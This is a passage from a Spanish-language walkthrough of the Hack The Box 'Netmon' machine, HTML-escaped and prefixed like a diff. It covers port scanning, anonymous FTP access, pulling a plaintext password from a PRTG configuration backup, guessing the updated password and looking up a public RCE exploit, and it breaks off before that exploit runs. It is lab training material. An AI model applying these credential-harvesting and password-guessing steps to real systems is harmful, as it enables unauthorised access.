-PING 10.10.10.152 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.152&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.152: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.152 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.924/136.924/136.924/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-06 18:09 CST
-Initiating SYN Stealth Scan at 18:09
-Scanning 10.10.10.152 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 139/tcp on 10.10.10.152
-Discovered open port 445/tcp on 10.10.10.152
-Discovered open port 135/tcp on 10.10.10.152
-Discovered open port 21/tcp on 10.10.10.152
-Discovered open port 80/tcp on 10.10.10.152
-Discovered open port 49669/tcp on 10.10.10.152
-Discovered open port 5985/tcp on 10.10.10.152
-Discovered open port 49667/tcp on 10.10.10.152
-Discovered open port 49664/tcp on 10.10.10.152
-Discovered open port 49666/tcp on 10.10.10.152
-Discovered open port 49665/tcp on 10.10.10.152
-Discovered open port 49668/tcp on 10.10.10.152
-Discovered open port 47001/tcp on 10.10.10.152
-Completed SYN Stealth Scan at 18:10, 16.59s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.152
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2022-02-06 18:09:48 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;17s
-Not shown: 65197 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 325 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE      REASON
-21/tcp    open  ftp          syn-ack ttl 127
-80/tcp    open  http         syn-ack ttl 127
-135/tcp   open  msrpc        syn-ack ttl 127
-139/tcp   open  netbios-ssn  syn-ack ttl 127
-445/tcp   open  microsoft-ds syn-ack ttl 127
-5985/tcp  open  wsman        syn-ack ttl 127
-47001/tcp open  winrm        syn-ack ttl 127
-49664/tcp open  unknown      syn-ack ttl 127
-49665/tcp open  unknown      syn-ack ttl 127
-49666/tcp open  unknown      syn-ack ttl 127
-49667/tcp open  unknown      syn-ack ttl 127
-49668/tcp open  unknown      syn-ack ttl 127
-49669/tcp open  unknown      syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.70 seconds
-           Raw packets sent: 81004 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.564MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67859 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.714MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.152
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-06 18:10 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.152                
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                     
-                                                                
-PORT      STATE SERVICE      VERSION          
-21/tcp    open  ftp          Microsoft ftpd     
-| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| 02-02-19  11:18PM                 1024 .rnd
-| 02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub                                                                                 
-| 07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs    
-| 02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
-| 02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| 02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users            
-|_02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows  
-| ftp-syst:                                                     
-|_  SYST: Windows_NT                                                                                                             
-80/tcp    open  http         Indy httpd 18.1.37.13946 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Paessler PRTG bandwidth monitor&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| http-title: Welcome | PRTG Network Monitor &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NETMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_Requested resource was /index.htm        
-|_http-server-header: PRTG/18.1.37.13946                                                                                         
-|_http-trane-info: Problem with XML parsing of /evox/about
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Not Found                                         
-|_http-server-header: Microsoft-HTTPAPI/2.0       
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Not Found                                                                                                          
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49668/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  msrpc        Microsoft Windows RPC
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-02-07T00:11:39
-|_  start_date: 2022-02-07T00:08:23
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;66.54 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el puerto 21 abierto, así que vamos a tratar de ingresar como el usuario &lt;strong&gt;anonymous&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.152
-Connected to 10.10.10.152.
-220 Microsoft FTP Service
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.152:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
-Password:
-230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-02-02-19  11:18PM                 1024 .rnd
-02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub
-07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
-02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
-02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users
-02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows
-226 Transfer complete.
-ftp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos acceso y vemos una estructura de lo que encontraría con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt;, com son varios recursos, vamos hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curlftpfs&lt;/code&gt; para crearnos una montura.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/ftp
-❯ curlftpfs anonymous:loquesea@10.10.10.152 /mnt/ftp/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora ya podemos ingresar más cómodos a la montura y visualizar los recursos de la máquina víctima. Pero para no buscar recursos en todos lados; vemos que también se encuentra abierto el puerto 80, así que antes de ver el contenido vía web, ocuparemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.152/
-http://10.10.10.152/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block]
-ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No tenemos nada interesante, así que ahora si visualizamos el contenido vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos enfrentamos antes un &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt; e igual dicha tecnología presenta credenciales default, que buscando un poco las credenciales son &lt;strong&gt;prtgadmin : prtgadmin&lt;/strong&gt;; sin embargo, vemos que no podemos ingresar. Pensando un poco como atacantes, podríamos deducir que existe un posible archivos de configuración en donde se guarden credenciales en texto claro y tenemos una vía de acceso de esos recursos por FTP.&lt;/p&gt;
-
-&lt;p&gt;Investigando un poco, encontramos el recurso &lt;a href=&quot;https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data&quot;&gt;paessler.com&lt;/a&gt; y vemos que la posibles rutas donde se encuentra instalado el software de &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt; serian:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;%programfiles%\PRTG Network Monitor&lt;/li&gt;
-  &lt;li&gt;%programfiles(x86)%\PRTG Network Monitor&lt;/li&gt;
-  &lt;li&gt;%programdata%\Paessler\PRTG Network Monitor&lt;/li&gt;
-  &lt;li&gt;%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Vamos a validarlas en la montura que tenemos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/ftp
-❯ ll
-d--------- root root   0 B  Sun Nov 20 21:46:00 2016  &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
-d--------- root root   0 B  Sun Feb  3 07:05:00 2019  Documents and Settings
-d--------- root root   0 B  Mon Feb 25 21:15:00 2019  inetpub
-d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
-d--------- root root   0 B  Mon Feb 25 21:56:00 2019  Program Files
-d--------- root root   0 B  Sat Feb  2 23:28:00 2019  Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-d--------- root root   0 B  Wed Dec 15 09:40:00 2021  ProgramData
-d--------- root root   0 B  Sun Feb  3 07:05:00 2019  Recovery
-d--------- root root   0 B  Sun Feb  3 07:04:00 2019  System Volume Information
-d--------- root root   0 B  Sun Feb  3 07:08:00 2019  Users
-d--------- root root   0 B  Mon Feb 25 22:49:00 2019  Windows
-.--------- root root 380 KB Sun Nov 20 20:59:00 2016  bootmgr
-.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
-.--------- root root 704 MB Sun Feb  6 19:08:00 2022  pagefile.sys
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos la carpeta &lt;strong&gt;ProgramData&lt;/strong&gt; que corresponde al tercer punto de las posibles rutas donde se encuentra instalado el programa; así que vamos por ahí.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ProgramData
-❯ ll
-d--------- root root 0 B Sun Feb  3 07:05:00 2019  Application Data
-d--------- root root 0 B Wed Dec 15 09:40:00 2021  Corefig
-d--------- root root 0 B Sun Feb  3 07:05:00 2019  Desktop
-d--------- root root 0 B Sun Feb  3 07:05:00 2019  Documents
-d--------- root root 0 B Sat Feb  2 23:15:00 2019  Licenses
-d--------- root root 0 B Sun Nov 20 21:36:00 2016  Microsoft
-d--------- root root 0 B Sat Feb  2 23:18:00 2019  Paessler
-d--------- root root 0 B Sun Feb  3 07:05:00 2019  regid.1991-06.com.microsoft
-d--------- root root 0 B Sat Jul 16 09:18:00 2016  SoftwareDistribution
-d--------- root root 0 B Sun Feb  3 07:05:00 2019  Start Menu
-d--------- root root 0 B Sat Feb  2 23:15:00 2019  TEMP
-d--------- root root 0 B Sun Feb  3 07:05:00 2019  Templates
-d--------- root root 0 B Sun Nov 20 21:19:00 2016  USOPrivate
-d--------- root root 0 B Sun Nov 20 21:19:00 2016  USOShared
-d--------- root root 0 B Mon Feb 25 21:56:00 2019  VMware
-❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Paessler
-❯ ll
-d--------- root root 0 B Sun Feb  6 19:09:00 2022  PRTG Network Monitor
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a ver que archivos se encuentran en &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Network Monitor&quot;&lt;/span&gt;
-❯ ll
-d--------- root root   0 B  Wed Dec 15 07:23:00 2021  Configuration Auto-Backups
-d--------- root root   0 B  Sun Feb  6 19:09:00 2022  Log Database
-d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Sensors&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-d--------- root root   0 B  Sun Feb  6 19:09:00 2022  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Web Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-d--------- root root   0 B  Wed Dec 15 07:19:00 2021  Monitoring Database
-d--------- root root   0 B  Mon Feb 25 22:00:00 2019  Report PDFs
-d--------- root root   0 B  Sat Feb  2 23:18:00 2019  System Information Database
-d--------- root root   0 B  Sat Feb  2 23:40:00 2019  Ticket Database
-d--------- root root   0 B  Sat Feb  2 23:18:00 2019  ToDo Database
-.--------- root root 1.1 MB Mon Feb 25 21:54:00 2019  PRTG Configuration.dat
-.--------- root root 1.1 MB Mon Feb 25 21:54:00 2019  PRTG Configuration.old
-.--------- root root 1.1 MB Sat Jul 14 03:13:00 2018  PRTG Configuration.old.bak
-.--------- root root 1.6 MB Sun Feb  6 19:09:00 2022  PRTG Graph Data Cache.dat
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Encontramos unos archivos de configuración &lt;strong&gt;PRTG Configuration&lt;/strong&gt;, los cuales podrían contener configuración de la tecnología, como su nombre lo indica, y tal vez encontraríamos credenciales de acceso.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ file PRTG&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-PRTG Configuration.dat:     XML 1.0 document, UTF-8 Unicode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; text, with very long lines, with CRLF line terminators
-PRTG Configuration.old:     XML 1.0 document, UTF-8 Unicode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; text, with very long lines, with CRLF line terminators
-PRTG Configuration.old.bak: XML 1.0 document, UTF-8 Unicode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; text, with very long lines, with CRLF line terminators
-PRTG Graph Data Cache.dat:  data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Uno que ya nos debería llamar un poco la atención sería el que termina en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bak&lt;/code&gt; ya que hace referencia a un backup y si revisamos su contenido, encontramos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Configuration.old.bak&quot;&lt;/span&gt; | less &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
-...
-&amp;lt;dbpassword&amp;gt;
-&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; User: prtgadmin &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-PrTg@dmin2018
-&amp;lt;/dbpassword&amp;gt;
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos las credenciales &lt;strong&gt;prtgadmin : PrTg@dmin2018&lt;/strong&gt;; podríamos tratar de probarlas en el panel de login, pero vemos que no podemos acceder. Pensando un poco, dichas credenciales las obtuvimos del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PRTG Configuration.old.bak&lt;/code&gt;, lo que nos hace referencia que son antiguas y ¿si la contraseña sigue el mismo principio cambiando el año? Podríamos tratar de ingresar &lt;strong&gt;PrTg@dmin2019&lt;/strong&gt;, &lt;strong&gt;PrTg@dmin2020&lt;/strong&gt;, y así sucesivamente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Las credenciales de acceso son &lt;strong&gt;prtgadmin : PrTg@dmin2019&lt;/strong&gt; y ya hemos ingresado al sistema. Nos enfrentamos ante un PRTG Network Monitor de versión 18.1.37.13946, entonces vamos a tratar de buscar algún exploit público que nos ayude a ingresar al sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit prtg network monitor
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-PRTG Network Monitor 18.2.38 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Remote Code Execution                           | windows/webapps/46527.sh
-PRTG Network Monitor 20.4.63.1412 - &lt;span class=&quot;s1&quot;&gt;'maps'&lt;/span&gt; Stored XSS                                          | windows/webapps/49156.txt
-PRTG Network Monitor &amp;lt; 18.1.39.1648 - Stack Overflow &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Denial of Service&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                       | windows_x86/dos/44500.py
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos uno &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/webapps/46527.sh&lt;/code&gt;, así que tratamos de ver que hace. Básicamente tenemos que crear una notificación en la parte de &lt;strong&gt;Setup &amp;gt; Notifications&lt;/strong&gt;, hacemos clicp en el símbol de &lt;strong&gt;+&lt;/strong&gt; en la parte superior derecha y luego click en &lt;strong&gt;Add new notification&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
